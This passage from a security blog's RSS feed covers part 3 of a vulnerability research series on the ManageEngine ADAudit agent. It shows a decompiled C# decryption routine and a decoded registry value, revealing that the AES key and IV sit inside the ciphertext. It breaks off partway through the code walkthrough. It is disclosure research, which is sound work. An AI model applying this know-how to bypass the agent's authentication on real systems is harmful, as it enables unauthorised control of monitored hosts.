&lt;p&gt;Part 3: &lt;a href=&#34;https://www.shelltrail.com/research/manageengine-adaudit-reverse-engineering-windows-rpc-to-find-cve-2024-36036-and-cve-2024-36037-part3/&#34;&gt;https://www.shelltrail.com/research/manageengine-adaudit-reverse-engineering-windows-rpc-to-find-cve-2024-36036-and-cve-2024-36037-part3/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Or if you missed part 1: &lt;a href=&#34;https://www.shelltrail.com/research/manageengine-adaudit-reverse-engineering-windows-rpc-to-find-cve-2024-36036-and-cve-2024-36037-part1/&#34;&gt;https://www.shelltrail.com/research/manageengine-adaudit-reverse-engineering-windows-rpc-to-find-cve-2024-36036-and-cve-2024-36037-part1/&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>ManageEngine ADAudit - Reverse engineering Windows RPC to find CVEs - part 3/reverse engineering cryptography</title>
      <link>https://www.shelltrail.com/research/manageengine-adaudit-reverse-engineering-windows-rpc-to-find-cve-2024-36036-and-cve-2024-36037-part3/</link>
      <pubDate>Mon, 27 May 2024 00:00:00 +0000</pubDate>
      
      <guid>https://www.shelltrail.com/research/manageengine-adaudit-reverse-engineering-windows-rpc-to-find-cve-2024-36036-and-cve-2024-36037-part3/</guid>
      <description>&lt;h2 id=&#34;background&#34;&gt;Background&lt;/h2&gt;
&lt;p&gt;If you followed along part 1 and part 2 of this research you know that
we built a custom &lt;code&gt;adauditrpc-client&lt;/code&gt; and then reverse engineered the
agent to successfully use it to make configuration changes on the host
system of the agent.&lt;/p&gt;
&lt;p&gt;The requirement for this custom RPC client to successfully authenticate was:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Authenticated remote SMB or local access to the named pipe exposed by the agent.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;AgentUID&lt;/code&gt; stored in the registry hive.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;When this vulnerability was about to be reported to the team at
ManageEngine a &lt;em&gt;small&lt;/em&gt; detail was discovered:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;- &lt;em&gt;&amp;ldquo;We are not using the latest version&amp;rdquo;&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;So the ADAudit Plus server used in this research was upgraded from 7050 to
7251 as well as the ADAudit Agent and hope was placed that the POC should work even on the latest
version. It did not.&lt;/p&gt;
&lt;h2 id=&#34;security-mitigation&#34;&gt;Security mitigation&lt;/h2&gt;
&lt;p&gt;To figure out what was wrong with our custom RPC client we decompiled the &lt;code&gt;ADAPAgent.exe&lt;/code&gt;
once again with dnSpy to see if anything had changed between the versions.&lt;/p&gt;
&lt;p&gt;We start by analyzing the &lt;code&gt;NotifyAgentStr&lt;/code&gt; function that was called via the custom
&lt;code&gt;adauditrpc-client&lt;/code&gt;.
Interesting, a new value is being checked:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-diff&#34; data-lang=&#34;diff&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;private static int NotifyAgentStr(int notifyId, string msgStr)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	int errStatus = 1;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	try
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		Hashtable msgMap = JsonAPI.JsonToHashtable(msgStr);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-		if (msgMap.ContainsKey(&amp;#34;AgentUID&amp;#34;) &amp;amp;&amp;amp; DataStore.Get(&amp;#34;AgentUID&amp;#34;).ToString().Equals(msgMap[&amp;#34;AgentUID&amp;#34;].ToString()))
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;+		if (msgMap.ContainsKey(&amp;#34;AgentAuthID&amp;#34;) &amp;amp;&amp;amp; string.Equals(DataStore.Get(&amp;#34;AgentAuthID&amp;#34;).ToString(), msgMap[&amp;#34;AgentAuthID&amp;#34;].ToString(), StringComparison.CurrentCultureIgnoreCase))
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;&lt;/span&gt;		{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			errStatus = 0;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[...]
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The value &lt;code&gt;AgentUID&lt;/code&gt; that we previously used as authentication is now replaced
with &lt;code&gt;AgentAuthID&lt;/code&gt;. Lets check this out in the registry:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;encrypted-agentauthid-in-the-registry.png&#34; alt=&#34;encrypted-agentauthid-in-the-registry&#34;&gt;&lt;/p&gt;
&lt;p&gt;It is a long value and as it does not match any known hash, it&amp;rsquo;s likely encrypted:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@adpen1:~$ hash-identifier 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;HASH: MzZc42XU0S9wd1QqDhxZf7djz3laBswMY57K5H0aMclEYWnS+iAy6wsnKuF31TYKNw8Lk1D3ijxqEcVcDaMG3SBtBJU7/KX/EyVs9H//Q+XZn/OGkNcW4Of7b8mNXHKI0N0a
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Not Found.
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;base64&lt;/code&gt; decode piping to &lt;code&gt;xxd&lt;/code&gt; does not give any more clues:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@adpen1:~$ echo -n MzZc42XU0S9wd1QqDhxZf7djz3laBswMY57K5H0aMclEYWnS+iAy6wsnKuF31TYKNw8Lk1D3ijxqEcVcDaMG3SBtBJU7/KX/EyVs9H//Q+XZn/OGkNcW4Of7b8mNXHKI0N0a | base64 -d | xxd
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;00000000: &lt;span style=&#34;color:#ae81ff&#34;&gt;3336&lt;/span&gt; 5ce3 65d4 d12f &lt;span style=&#34;color:#ae81ff&#34;&gt;7077&lt;/span&gt; 542a 0e1c 597f  36&lt;span style=&#34;color:#ae81ff&#34;&gt;\.&lt;/span&gt;e../pwT*..Y.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;00000010: b763 cf79 5a06 cc0c 639e cae4 7d1a 31c9  .c.yZ...c...&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;.1.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;00000020: &lt;span style=&#34;color:#ae81ff&#34;&gt;4461&lt;/span&gt; 69d2 fa20 32eb 0b27 2ae1 77d5 360a  Dai.. 2..&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;*.w.6.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;00000030: 370f 0b93 50f7 8a3c 6a11 c55c 0da3 06dd  7...P..&amp;lt;j..&lt;span style=&#34;color:#ae81ff&#34;&gt;\.&lt;/span&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;00000040: 206d &lt;span style=&#34;color:#ae81ff&#34;&gt;0495&lt;/span&gt; 3bfc a5ff &lt;span style=&#34;color:#ae81ff&#34;&gt;1325&lt;/span&gt; 6cf4 7fff 43e5   m..;....%l...C.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;00000050: d99f f386 90d7 16e0 e7fb 6fc9 8d5c &lt;span style=&#34;color:#ae81ff&#34;&gt;7288&lt;/span&gt;  ..........o..&lt;span style=&#34;color:#ae81ff&#34;&gt;\r&lt;/span&gt;.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;00000060: d0dd 1a                                  ...
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Lets continue reviewing the &lt;code&gt;ADAPAgent.exe&lt;/code&gt; source code. If we follow
the &lt;code&gt;DataStore.Get()&lt;/code&gt; function we can see at line 459 that the &lt;code&gt;Cryptography.Decrypt()&lt;/code&gt;
is called.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;decryption-process-of-adapagent.png&#34; alt=&#34;decryption-process-of-adapagent&#34;&gt;&lt;/p&gt;
&lt;p&gt;This looks fun:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c#&#34; data-lang=&#34;c#&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:  &lt;span style=&#34;color:#75715e&#34;&gt;// Agent.Common.Helpers.Cryptography&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;:  &lt;span style=&#34;color:#75715e&#34;&gt;// Token: 0x060002A0 RID: 672 RVA: 0x00019E3C File Offset: 0x0001803C&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;:  &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt; Decrypt(&lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt; cipherStr)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;:  {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;:      &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt; output = &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;:      &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;:      {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;:	    	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;.IsNullOrEmpty(cipherStr) || cipherStr.Length &amp;lt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;:	    	{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;:	    		Logger.Event.InfoFormat(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;String cannot be Decrypted&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;object&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;:	    		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; output;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;:	    	}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;:	    	&lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;[] cipherText = Convert.FromBase64String(cipherStr);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;:	    	&lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt; terminateByte = &lt;span style=&#34;color:#ae81ff&#34;&gt;92&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;:	    	&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; plainTextIndex = Array.IndexOf&amp;lt;&lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;&amp;gt;(cipherText, terminateByte);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;:	    	&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; plainTextLength = &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;.Parse(Encoding.ASCII.GetString(cipherText.Take(plainTextIndex).ToArray&amp;lt;&lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;&amp;gt;()));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;:	    	plainTextLength += &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt; - plainTextLength % &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;:	    	plainTextIndex++;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;:	    	&lt;span style=&#34;color:#66d9ef&#34;&gt;using&lt;/span&gt; (Aes aes = Aes.Create())
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;:	    	{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;:	    		aes.Key = cipherText.Skip(plainTextIndex).Take(&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;).ToArray&amp;lt;&lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;&amp;gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;:	    		aes.IV = cipherText.Skip(&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt; + plainTextIndex).Take(&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;).ToArray&amp;lt;&lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;&amp;gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;:	    		cipherText = cipherText.Skip(&lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt; + plainTextIndex).Take(plainTextLength).ToArray&amp;lt;&lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;&amp;gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;:	    		Aes aes2 = aes;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;:	    		&lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;[] plainTextBytes = aes2.CreateDecryptor(aes2.Key, aes.IV).TransformFinalBlock(cipherText, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, cipherText.Length);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;:	    		output = Encoding.UTF8.GetString(plainTextBytes);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;:	    	}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;:     }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;:	    &lt;span style=&#34;color:#66d9ef&#34;&gt;catch&lt;/span&gt; (Exception ex)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;:     {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;:	        Logger.Event.ErrorFormat(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Exception in Decrypt: &amp;#34;&lt;/span&gt; + ex.Message, &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;object&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;:	    	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;:	    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;:	    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; output;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt;: }
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Lets break down the code:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Line 13 takes the cipherStr (aka &lt;code&gt;AgentAuthID&lt;/code&gt;) and base64 decodes it.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c#&#34; data-lang=&#34;c#&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;:	    	&lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;[] cipherText = Convert.FromBase64String(cipherStr);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Line 14 creates a &lt;code&gt;terminateByte&lt;/code&gt; variable where 92 in decimal ascii represents &lt;code&gt;\&lt;/code&gt; or &lt;code&gt;\x5c&lt;/code&gt; in hex.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c#&#34; data-lang=&#34;c#&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;:	    	&lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt; terminateByte = &lt;span style=&#34;color:#ae81ff&#34;&gt;92&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Line 15 creates an int named &lt;code&gt;plainTextIndex&lt;/code&gt;. This code excerpt finds the position of the first occurring &lt;code&gt;\&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c#&#34; data-lang=&#34;c#&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;:	    	&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; plainTextIndex = Array.IndexOf&amp;lt;&lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;&amp;gt;(cipherText, terminateByte);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Line 16 creates an int named &lt;code&gt;plainTextLength&lt;/code&gt; which contains the string in our cipherStr up to the first &lt;code&gt;\&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c#&#34; data-lang=&#34;c#&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;:	    	&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; plainTextLength = &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;.Parse(Encoding.ASCII.GetString(cipherText.Take(plainTextIndex).ToArray&amp;lt;&lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;&amp;gt;()));
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This is actually sane if you remember our xxd output. Could our plainText be 36 charachters long?:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    user@adpen1:~$ echo -n MzZ&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;...&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;N0a | base64 -d | xxd
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    00000000: &lt;span style=&#34;color:#ae81ff&#34;&gt;3336&lt;/span&gt; 5ce3 65d4 d12f &lt;span style=&#34;color:#ae81ff&#34;&gt;7077&lt;/span&gt; 542a 0e1c 597f  36&lt;span style=&#34;color:#ae81ff&#34;&gt;\.&lt;/span&gt;e../pwT*..Y.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    00000010: b763 cf79 5a06 cc0c 639e cae4 7d1a 31c9  .c.yZ...c...&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;.1.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    00000020: &lt;span style=&#34;color:#ae81ff&#34;&gt;4461&lt;/span&gt; 69d2 fa20 32eb 0b27 2ae1 77d5 360a  Dai.. 2..&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;*.w.6.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    00000030: 370f 0b93 50f7 8a3c 6a11 c55c 0da3 06dd  7...P..&amp;lt;j..&lt;span style=&#34;color:#ae81ff&#34;&gt;\.&lt;/span&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    00000040: 206d &lt;span style=&#34;color:#ae81ff&#34;&gt;0495&lt;/span&gt; 3bfc a5ff &lt;span style=&#34;color:#ae81ff&#34;&gt;1325&lt;/span&gt; 6cf4 7fff 43e5   m..;....%l...C.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    00000050: d99f f386 90d7 16e0 e7fb 6fc9 8d5c &lt;span style=&#34;color:#ae81ff&#34;&gt;7288&lt;/span&gt;  ..........o..&lt;span style=&#34;color:#ae81ff&#34;&gt;\r&lt;/span&gt;.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    00000060: d0dd 1a                                  ...
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Line 17 increases to our &lt;code&gt;plainTextLength&lt;/code&gt; to ensure that the length of the int is a multiple of 16 bytes, which is a requirement for the AES block cipher.&lt;/p&gt;
